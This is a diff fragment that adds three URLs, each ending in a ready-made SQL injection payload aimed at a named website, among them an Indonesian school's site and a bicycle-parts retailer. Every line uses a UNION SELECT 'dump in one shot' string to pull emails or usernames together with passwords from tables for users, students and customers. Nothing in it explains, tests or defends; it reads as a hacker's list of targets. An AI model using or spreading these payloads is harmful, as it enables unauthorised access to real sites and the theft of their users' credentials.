@@ -1,0 +1,4 @@
+http://refngo.com/centerdetails.php?id=26%20+AND+0+UNION+SELECT+1,22,3,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,user,0x203a3a20,pass,0x3c62723e))))x),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+
+http://www.dharmasuci.sch.id/?p=detberita&id=72' +AND+0+UNION+SELECT+1,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(sh_siswa)WHERE(@x)IN(@x:=CONCAT(0x20,@x,email,0x203a3a20,password,0x3c62723e))))x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+
+http://tektro-usa.com/category.php?catid=-183%20/*!00000union*/%20select%201,2,(select(@x)from(select(@x:=0x00),(select(0)from(customer)where(@x:=concat+(@x,0x3c62723e,Email,0x3a3a,Password))))x),4,5,6--+&productid=1144
+
